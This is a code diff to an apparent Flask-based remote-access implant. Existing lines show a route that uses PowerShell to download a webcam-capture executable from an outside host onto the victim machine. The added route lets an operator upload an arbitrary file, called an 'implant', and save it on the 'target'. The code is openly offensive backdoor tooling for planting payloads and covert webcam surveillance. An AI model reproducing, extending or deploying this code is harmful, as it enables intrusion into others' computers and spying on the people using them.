@@ -1,4 +1,4 @@
-from flask import Flask, send_file, render_template
+from flask import Flask, send_file, render_template, request
 import os
 import subprocess
 
@@ -68,3 +68,16 @@ def listfiles(path=''):
 def getcam():
 	out = subprocess.check_output("powershell Invoke-WebRequest -URI https://s3-eu-west-1.amazonaws.com/flowertracker/CommandCam.exe -OutFile cc.exe")
 	return 'Webcam controller done.'
+
+@app.route('/getanyfile/', methods=['POST', 'GET'])
+def getanyfile():
+	if request.method == 'GET':
+		return render_template('upload.html')
+	else:
+		f = request.files['implant']
+		uplname = f.filename
+		f.save(uplname)
+		return 'File uploaded to target.'
+
+
+	
